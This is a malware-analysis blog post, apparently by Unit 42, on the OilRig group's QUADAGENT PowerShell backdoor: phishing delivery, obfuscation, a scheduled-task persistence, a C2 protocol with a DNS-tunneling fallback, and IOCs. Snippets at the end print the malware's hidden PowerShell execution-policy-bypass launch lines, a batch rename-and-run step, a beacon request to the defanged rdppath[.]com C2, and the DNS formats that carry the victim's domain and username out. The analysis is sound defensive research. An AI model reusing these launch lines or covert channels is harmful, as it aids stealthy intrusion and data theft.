{
    "title": "oilrig targets technology service provider and government agency with quadagent",
    "text": "Tools\nPlaybooks\nSpeaking Events\nAbout Us\nOilRig Targets Technology Service Provider and\nGovernment Agency with QUADAGENT\n14,575\npeople reacted\n1\n14 min. read\nThe OilRig group  continues to adapt their tactics and bolster their toolset with newly developed tools. The OilRig\ngroup (AKA APT34, Helix Kitten) is an adversary motivated by espionage primarily operating in the Middle East\nregion. We first discovered  this group  in mid‐2016, although it is possible their operations extends earlier than\nthat time frame. They have shown themselves to be an extremely persistent adversary that shows no signs of\nslowing down. Examining their past behaviors with current events only seems to indicate that the OilRig group’s\noperations are likely to accelerate even further in the near future.\nBetween May and June 2018, Unit 42 observed multiple attacks by the OilRig group appearing to originate from a\ngovernment agency in the Middle East. Based on previously observed tactics, it is highly likely the OilRig group\nleveraged credential harvesting and compromised accounts to use the government agency as a launching\nplatform for their true attacks.\nThe targets in these attacks included a technology services provider as well as another government entity. Both\nthese targets were in the same nation‐state. Further, the attacks against these targets were made to appear to\nhave originated from other entities in the same country. However, the actual attackers themselves were outside\nthis country and likely used stolen credentials from the intermediary organization to carry out their attacks.\nThe attacks delivered a PowerShell backdoor called QUADAGENT, a tool attributed to the OilRig group by both\nClearSky Cyber Security  and FireEye. In our own analysis, we were able to also confirm the attribution of this tool\nto the OilRig group by examining specific artifacts that were reused from tools previously used by the OilRig\ngroup in addition to tactics reused from previous attacks as well. The use of script‐based backdoors is a common\ntechnique used by the OilRig group as we have previously documented. However, packaging these scripts into a\nportable executable (PE) file is not a tactic we have seen the OilRig group use frequently. Detailed analysis of\nQUADAGENT and its ties to Oilrig is the appendix at the end of this blog. QUADAGENT is the 12  custom built\ntool that Unit 42 has documented the OilRig group using for their attacks.\nOur analysis revealed the two QUADAGENT PE files we obtained were slightly different from each other.\nPrimarily, one used a Microsoft .NET Framework‐based dropper that also opens a decoy dialog box, which can be\nseen in Figure 1. The other sample was a PE file generated via a bat2exe tool.\n \nSHA256 Filename PowerShell Filename Variant\n5f001f3387ddfc0314446d0c950da2cec4c786\ne2374d42beb3acce6883bb4e63<redacted>\nTechnical\nServices.exeOffice365DCOMCheck.p\ns1Bat2exe\nd948d5b3702e140ef5b9247d26797b6dcdfe4f\ndb6f367bb217bc6b5fc79df520tafahom.exe,\nSales\nModification.exeSystemDiskClean.ps1 .NET\nTable 1. QUADAGENT PE Files\nThe QUADAGENT backdoors dropped onto the hosts were nearly identical to each other, with the only\ndifferences being the command and control server (C2) and randomized obfuscation. We were also able to locate\na third delivery package of the QUADAGENT backdoor as reported by ClearSky  Cyber Security. In their example,\nthe OilRig group used a malicious macro document to deliver the backdoor, which is a tactic much more\ncommonly used by them.\nA closer examination revealed the obfuscation used by the OilRig group in these QUADAGENT samples were\nlikely the result of using an open‐source toolkit called Invoke‐Obfuscation . This tool was originally intended to aid\ndefenders in simulating obfuscated PowerShell commands to better their defenses. Invoke‐Obfuscation has\nproven to be highly effective at obfuscating PowerShell scripts and in this case, the adversary was able to take\nadvantage of the tool for increased chances of evasion and as an anti‐analysis tactic.\n \nAttack Details\nThis latest attack consisted of three waves between May and June 2018. All three waves involved a single spear\nphishing email that appeared to originate from a government agency based in the Middle East. Based on our\ntelemetry, we have high confidence the email account used to launch this attack was compromised by the OilRig\ngroup, likely via credential theft.\nIn the two waves (May 30 and June 3) against the technology services provider, the victim email addresses were\nnot easily discoverable via common search engines, indicating the targets were likely part of a previously\ncollected target list, or possibly known associates of the compromised account used to send the attack emails.\nThe malicious attachment was a simple PE file (SHA256:\n5f001f3387ddfc0314446d0c950da2cec4c786e2374d42beb3acce6883bb4e63 ) with the filename\n<redacted> Technical Services.exe . The file appears to have been compiled using a bat2exe tool,\nwhich will take batch files ( .bat ) and convert them to PE ( .exe ) files. Its sole purpose here is to install the\nQUADAGENT backdoor and execute it.\nOnce the victim downloads and executes the email attachment, it runs silently with no additional decoy\ndocuments or decoy dialog boxes. The executable will drop the packaged QUADAGENT PowerShell script using\nthe filename Office365DCOMCheck.ps1  in addition to a VBScript file with the same filename which will assist\nin the execution of it. A scheduled task is also generated to maintain persistence of the payload. Once the\nQUADAGENT payload has executed, it will use  rdppath[.]com  as the C2, first via HTTPS, then HTTP, then\nvia DNS tunneling, each being used as a corresponding fallback channel if the former fails.\nThe wave against the government entity (June 26) also involved a simple PE file attachment (SHA256:\nd948d5b3702e140ef5b9247d26797b6dcdfe4fdb6f367bb217bc6b5fc79df520 ) using the filename\ntafahom.exe . This PE was slightly different from the other attack, being compiled using the Microsoft .NET\nFramework instead of being generated via a bat2exe tool and containing a decoy dialog box as shown in Figure 1.\n \nFigure 1. Decoy dialog box\nThe tactic of using a decoy dialog box is commonly used by multiple adversaries and is generally deployed as a\nmethod to reduce suspicion by the victim. In comparison to being silently run, a victim may be less suspicious of a\ndialog/error message because they are provided what appears to be a legitimate error response when\nattempting to open the attachment. When a file is silently run, because there is no response to the user’s action,\na victim may be more suspicious or curious on what actually happened.\nAfter the .NET PE file has been run, we observed the same behavior as the above QUADAGENT sample of\ndropping a PowerShell script with the filename SystemDiskClean.ps1  alongside a VBScript file with the same\nname. The C2 techniques remained identical, with the only change being the server which became\ncpuproc[.]com .\nUsing rdppath[.]com  as a pivot point, we collected an additional QUADAGENT sample also communicating to\nthis C2 (SHA256: d7130e42663e95d23c547d57e55099c239fa249ce3f6537b7f2a8033f3aa73de ),\nwhich was first reported by ClearSky Cyber Security. In contrast to the two samples used in these attacks, this\none did not use a PE attachment, and instead used a Microsoft Word document containing a malicious macro as\nthe delivery vehicle. The use of malicious macro delivery documents is a tactic we have observed the OilRig\ngroup use repeatedly  over the three years we’ve been tracking them. The actual QUADAGENT script payload\nused in the ClearSky sample was exactly the same as the one we found in the bat2exe version used against the\naforementioned technical services provider. The delivery document also used a filename that could be related to\nother technology services or media organizations within that same nation state, although it is inconclusive. The\ndocument also contained a lure image, similar to ones commonly found in malicious macro documents which ask\nthe user to click on “Enable Content” as seen in Figure 2. Unlike many other delivery documents used by this\ngroup, there was no additional decoy content after the macro was enabled.\n \nFigure 2. Lure image used to entice users to enable macros\nUse of Open Source Tools\nIn an attempt to avoid detection and as an anti‐analysis tactic, the OilRig group abused an open source tool called\nInvoke‐Obfuscation to obfuscate the code used for QUADAGENT. Invoke‐Obfuscation is freely available via a\nGithub repository  and allows a user to change the visual representation of a PowerShell script simply by selecting\nthe desired obfuscation techniques. Invoke‐Obfuscation offers a variety of obfuscation techniques, and by\nanalyzing the script we were able to ascertain the specific options in this attack. After identifying the specific\noptions used to obfuscate QUADAGENT, we were able to deobfuscate the PowerShell script and perform\nadditional analysis.\nWe found two obfuscation techniques applied to the script: the first one changing the representation of\nvariables; the second one changing the representation of strings in the script.\nInvoke‐Obfuscation calls the variable obfuscation technique used by the actors to obfuscate this script Random\nCase + {} + Ticks , which changes all variables in the script to have randomly cased characters, to be\nsurrounded in curly braces and to include the tick ( `) character, which is ignored in by PowerShell. Invoke‐\nObfuscation calls the string obfuscation used by the actors to further obfuscate this script Reorder, which uses\nthe string formatting functionality within PowerShell to reconstruct strings from out of order substrings (ex. “{1}\n{0}” -f ‘bar’,’foo’ ).\nDuring our analysis, we installed Invoke‐Obfuscation and used it to obfuscate a previously collected\nQUADAGENT sample to confirm our analysis.  We used the two previously mentioned obfuscation options within\nInvoke‐Obfuscation on this QUADAGENT sample, which resulted in the generation of a very similar script as the\nOffice365DCOMCheck.ps1  and SystemDiskClean.ps1  payloads delivered in the attacks discussed in this\nblog. We captured the commands we ran in Invoke‐Obfuscation in the animation in Figure 3 below, which\nvisualizes the steps the threat actor may have taken to create the payload delivered in this attack.\n \nFigure 3. Possible steps carried out in Invoke‐Obfuscation on the QUADAGENT sample\nConclusion\nThe OilRig group continues to be a persistent adversary group in the Middle East region. While their delivery\ntechniques are fairly simple, the various tools we have attributed as part of their arsenal reveal sophistication. In\nthis instance, they illustrated a typical behavior of adversary groups, wherein the same tool was reused in\nmultiple attacks, but each had enough modifications via infrastructure change, additional obfuscation, and\nrepackaging that each sample may appear different enough to bypass security controls. A key component to\nalways remember is that for these type of adversary groups, they will follow the path of least resistance in their\nattacks, as long as their mission directive is accomplished.\nPalo Alto Networks customers may learn more and are protected via the following ways:\nWildFire classifies QUADAGENT samples as malicious\nQUADAGENT C2 Domains have been classified as malicious\nAutoFocus customers can track QUADAGENT  via its corresponding tag\n \nIOCs\nSHA256 Hashes\nQUADAGENT\nd948d5b3702e140ef5b9247d26797b6dcdfe4fdb6f367bb217bc6b5fc79df520\nd7130e42663e95d23c547d57e55099c239fa249ce3f6537b7f2a8033f3aa73de\n5f001f3387ddfc0314446d0c950da2cec4c786e2374d42beb3acce6883bb4e63\n \nThreeDollars\n1f6369b42a76d02f32558912b57ede4f5ff0a90b18d3b96a4fe24120fa2c300c\n119c64a8b35bd626b3ea5f630d533b2e0e7852a4c59694125ff08f9965b5f9cc\n \nDomains\nrdppath[.]com\ncpuproc[.]com\nacrobatverify[.]com\n \nFilenames\nOffice365DCOMCheck.ps1\nOffice365DCOMCheck.vbs\nSystemDiskClean.ps1\nSystemDiskClean.vbs\nAdobeAcrobatLicenseVerify.ps1\nc:\\Users\\<username>\\AppData\\Roaming\\Out.jpg\n \nAppendix\nQUADAGENT Relationship to Other OilRig Tools\nDuring our regular data gathering functions several months ago, we collected a delivery document (SHA256:\n1f6369b42a76d02f32558912b57ede4f5ff0a90b18d3b96a4fe24120fa2c300c ) that contained an at‐\nthe‐time an unknown payload which would be revealed to be QUADAGENT. While we do not have data\nsupporting targeting information or telemetry, we know the document was created in January 2018 and likely\nused in an attack around that time frame. In addition, the delivery document shared metadata artifacts with the\nThreeDollars delivery document (SHA256:\n119c64a8b35bd626b3ea5f630d533b2e0e7852a4c59694125ff08f9965b5f9cc ) that OilRig used to\ndeliver the ISMAgent payload in a targeted attack  In January 2018 on a government entity in the Middle East.\nThe QUADAGENT payload dropped by the delivery document had the filename\nAdobeAcrobatLicenseVerify.ps1  and used acrobatverify[.]com\nfor its C2. Examining the subdomains for acrobatverify[.]com  reveals three subdomains, www, resolve, and\ndns. The passive DNS data for the subdomains shows an IP resolution of 185.162.235[.]121  from December\n2017 through January 2018. Prior to this time period, we see several subdomains of msoffice-cdn[.]com ,\nns1, ns2, and www also resolving to this IP. This IP and msoffice-cdn[.]com  were both previously\nreferenced  in our first report on an OilRig attack using the ThreeDollars delivery document.\nWe used this QUADAGENT payload when testing the Invoke‐Obfuscation tool mentioned in this blog. By applying\ntwo specific obfuscation techniques within Invoke‐Obfuscation, we were able to create an obfuscated\nPowerShell script that was very similar to the QUADAGENT payloads delivered in the attacks discussed in this\nblog.\n \nQUADAGENT Analysis\nThe final payload delivered in all three attack waves is a PowerShell downloader referred to by other research\norganizations as QUADAGENT. The downloaders in these attacks were configured to use both rdppath[.]com and\ncpuproc[.]com as their C2 servers. When communicating with its C2 server, the downloaders use multiple\nprotocols, specifically HTTPS, HTTP or DNS, each of which provide a fallback channel in that order. For instance,\nthe downloader will first attempt to communicate with its C2 server using an HTTPS request. If that HTTPS\nrequest is not successful, the downloader will issue an HTTP request. Lastly, if the HTTP request is not\nsuccessful, the downloader will fallback to using DNS tunneling to establish communications. We provide more\non the specific usage of these protocols as we discuss the inner workings of this malware in this section.\nThe downloader will use the filename of the script (ex. Office365DCOMCheck or SystemDiskClean) as the name\nfor the scheduled task to maintain persistence on the victim host. To create the scheduled task, the PowerShell\npayload starts by writing the following to a VBScript file with the same name as the task name  (ex.\nOffice365DCOMCheck.vbs  or SystemDiskClean.vbs ) within the %TEMP%  folder:\nThe scheduled task will then run every five minutes, which provides persistent execution of the downloader\nscript. The task itself is fairly simple, calling the VBScript file which contains a PowerShell one‐liner as an\nargument to run the QUADAGENT payload (ex. Office365DCOMCheck.ps1  and SystemDiskClean.ps1 ):\nAfter setting up persistent access, the payload checks to see if a value exists within a registry key in the HKCU\nhive whose name is the same as the scheduled task (ex. Office365DCOMCheck or SystemDiskClean), such as\nthe following:\n \nHKCU\\Office365DCOMCheck\n \nThe payload uses this registry key to store a session identifier unique to the compromised system, as well as a\npre‐shared key used for encrypting and decrypting communications between the system and the C2 server. This\nregistry key is empty upon the first execution of the payload. The payload will communicate with its C2 server to\nobtain the session ID and pre‐shared key and write it to this registry key in the following format:\n \n<session id>_<pre-shared key>\n \nTo obtain the session ID and pre‐shared key, the payload will first try to contact the C2 via an HTTPS GET\nrequest to the following URL:\n \nhxxps://www.rdppath[.]com/\n \nIf the above request using HTTPS does not result in an HTTP 200 OK message or the response data has no\nalphanumeric characters, the code will attempt to communicate with the C2 server using HTTP via the following\nURL:\n \nhxxp://www.rdppath[.]com/\n \nThe code to communicate with the C2 via HTTP exists within an exception handler. To trigger this, if the HTTPS\nrequests do not work, the payload attempts to cause an exception by dividing 1 by 0. This exception invokes the\nexception handler containing the HTTP communication code, allowing it to run.\nIf either attempt is successful, the C2 server will respond with the session ID and a pre‐shared key in cleartext,\nwhich it will save to the previously mentioned registry key. The C2 server will provide the pre‐shared key within\nthe response data and will provide the session ID value via the Set-Cookie  field within the response,\nspecifically the string after the PHPSESSID  parameter of the cookie.\nIf both attempts fail and the payload is unable to obtain a session ID and pre‐shared key via HTTP or HTTPS, it\nwill try to use DNS tunneling. To obtain the session ID and pre‐shared key, the payload will issue a query to\nresolve the following domain:\n \nmail.<random number between 100000 and 999999>.<c2 name>\n \nThis request notifies the C2 server that the payload is about to send system specific data as part of the initial\nhandshake. The script gathers system specific data, such as the domain the system belongs to and the current\nusername, that it constructs in the following format:\n \n<domain>\\<username>:pass\n \nThe above string is encoded using a custom base64 encoder to strip out non‐alphanumeric characters ( =, / and\n+) from the data and replaces them with domain safe values ( 01, 02 and 03 respectively).\n<encoded system data>.<same random number between 100000 and 999999 above>.<c2\nname>\n \nAfter obtaining a session ID and pre‐shared key, the PowerShell script will continue to communicate with its C2\nserver to obtain data to treat as a command. The script will first attempt to communicate with the C2 server\nusing HTTPS (HTTP if unsuccessful), which involves GET requests using the session ID within the request’s\ncookie in the PHPSESSID  field, as seen in the example GET request:\nIf the payload is unable to reach the C2 via HTTPS/HTTP, the payload yet again falls back to DNS tunneling. The\npayload will issue a DNS query to the following domain to notify the C2 that it is about to send it data (session ID\nvalue) to it in a subsequent query:\n \nns1.<random number between 100000 and 999999>.<c2 name>\nThe payload does nothing with the C2 server’s response to the query. Instead, it immediately issues a query to\nresolve the following domain, which embeds the session ID value to transmit it to the C2:\n \n<encoded session id>.<same random number between 100000 and 999999>.<c2 domain\nname>\n \nTo transmit the data via the DNS tunneling, the C2 server will respond to the above query with an IPv6 address\nthat contains the number of DNS queries the payload must issue to obtain the entirety of the data from\nsubsequent IPv6 answers. The script will send the specified number of DNS queries using the following format,\neach of which the C2 will respond with an IPv6 address that the script will treat as a string of data:\n \nwww.<sequence number>.<same random number between 100000 and 999999>.<c2 domain\nname>\n \nThe payload will treat the data provided by the C2 as a message, which will have the following structure:\n \nhello<char uuid[35]><char type[1]><data>\n \nThe message will start with the string hello followed by a 35‐character UUID string. The type field specifies the\ncommand that the payload will handle. This specific variant of the payload can only handle one command type, x.\nThe data field within the message is a string of custom base64 encoded data that the malware decodes using the\nsame custom base64 routine mentioned earlier and decrypts it using AES and the pre‐shared key. The x\ncommand treats the supplied data as a PowerShell script that it will write to the current PowerShell script\n(Office365DCOMCheck.ps1/SystemDiskClean.ps1 ), effectively overwriting the initial PowerShell script\nwith a secondary payload script. Also, the x command will delete the generated registry key and the\nOffice365DCOMCheck/SystemDiskClean scheduled task. It will run the newly downloaded PowerShell script by\nrunning the following command via cmd /c :\nThe payload will then notify the C2 it has successfully downloaded and executed the secondary PowerShell\npayload. It does so using either the HTTPS/HTTP or DNS channels, depending on which method is successful.\nThe payload will construct a message that has the following structure that it will then send to the C2:\n \nbye<char uuid[35]>d\n \nThe message above is sent via a simple HTTPS/HTTP POST request to the C2 server. If that fails, the payload\nwill use DNS tunneling by first issuing a DNS query to resolve the following domain to notify the C2 that the\npayload will send data to it in subsequent DNS queries:\n \nns1.<random number between 100000 and 999999>.<c2 name>\n \nThe payload will then split the message up into 60‐byte chunks (only 1 in this case), which it will send to the C2\nvia DNS queries to resolve domains structured as:\n \n<encoded/encrypted data of message>.<same random number between 100000 and\n999999>.<c2 name>\n \nThe payload will notify the C2 that it is done sending data by issuing a DNS query to resolve a domain structured\nas:\n \nns2.<same random number between 100000 and 999999>.<c2 name>\n \nPackage Comparison of the QUADAGENT Samples\nThe bat2exe version (SHA256:\n5f001f3387ddfc0314446d0c950da2cec4c786e2374d42beb3acce6883bb4e63 )has a batch script,\nPowerShell script, and associated file names embedded within several resources that it will decrypt using RC4\nand various MD5 hashes for keys. The executable obtains an embedded PowerShell script, decrypts it using RC4,\nthen decompresses it using ZLIB, and saves the cleartext to C:\\Users\\\n<username>\\AppData\\Roaming\\Out.jpg . The batch script will then rename Out.jpg  to\nOffice365DCOMCheck.ps1  and execute it with the following command:\nThe .NET variant (SHA256:\nd948d5b3702e140ef5b9247d26797b6dcdfe4fdb6f367bb217bc6b5fc79df520 ) is even simpler. This\ndropper starts by displaying the dialog box in Figure 1, previously shown and discussed with the following\ncommand:\nThe dropper then writes the content of the payload which resides as plaintext in a resource within the .NET\nassembly to C:\\Users\\<username>\\AppData\\Local\\Temp\\SystemDiskClean.ps1 . It will then execute\nit as a shell object:\nIn the malicious macro attack, the same Office365DCOMCheck.ps1  script that was used in the PE version is\nused as the payload. When the document is opened, a lure image as shown as seen in Figure 2 is displayed in an\nattempt to coerce the victim to enable macros.\nWhen macros are enabled and run, the macro within the Word document searches the sections of the document\nto get the contents of the header using the following piece of code:\nThe code above obtains the contents of the header, which the macro will write to a file at\nC:\\programdata\\Office365DCOMCheck.ps1 . The creator of the delivery document was able to visually\nhide the PowerShell script in the header by setting the text to a font size of 2 and font color of white, as seen in\nFigure 4.\nFigure 4. Hidden PowerShell script within the document’s header using a small white font\nThis technique of hiding malicious content by using a small white font is not unique to this threat group, as we\nrecently observed the Sofacy  group use this technique to hide DDE instructions within one of their delivery\ndocuments.\nGet updates from Palo Alto  Networks!\nSign up to receive the latest news, cyber threat intelligence and research from us\nBy Bryan Lee  and Robert Falcone\nJuly 25, 2018 at 5:00 AM\nCategory: Unit 42\nTags: Invoke‐Obfuscation , OilRig , QUADAGENT , ThreeDollars\nth\nEmail address\nSubscribe\nI'm not a robot\nreCAPTCHA\nPrivacy  - Terms\nBy submitting this form, you agree to our Terms of Use  and acknowledge\nour Privacy Statement .\n© 2020 Palo Alto Networks, Inc. All rights reserved.\nPopular Resources\nResource Center\nBlog\nCommunities\nTech Docs\nUnit 42\nSitemap\nLegal No ces\nPrivacy\nTerms of Use\nDocuments\nAccount\nManage Subscriptions\nReport a Vulnerability1CreateObject (\"WScript.Shell\" ).Run \"\" & WScript.Arguments (0) & \"\", 0, False\n1wscript.exe \"Office365DCOMCheck.vbs\"  \\\"PowerShell .exe  -ExecutionPolicy bypass -WindowStyle hidden -NoProfile  '<current PowerShell script>'\n1\n2\n3\n4\n5GET / HTTP/1.1\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit /537.36 (KHTML, like Gecko) Chrome/42.0.2311.135  Safari/537.36\nHost: www.rdppath[.]com\nCookie: PHPSESSID =<c2 provided session id>\nConnection : Keep-Alive\n1wscript.exe \"Office365DCOMCheck.vbs\"  \"PowerShell.exe-ExecutionPolicy bypass -WindowStyle hidden -NoProfile <path to Office365DCOMCheck.ps1 script>\"\n1\n2\n3@shift /0\nrename Out.jpg Office365DCOMCheck .ps1\nPowerShell  -exec bypass -File .\\Office365DCOMCheck .ps1\n1Interaction .MsgBox(\"An error occurred while processing your request. code(2343)\" , MsgBoxStyle .Critical , null);\n1cmd.exe /c powershell  -exec bypass -file \"C:\\Users\\Administrator\\AppData\\Local\\Temp\\SystemDiskClean.ps1\"\n1Set rng = ActiveDocument .Sections (intSection ).Headers(1).Range\nSearch Unit 42\nSHARE \n "
}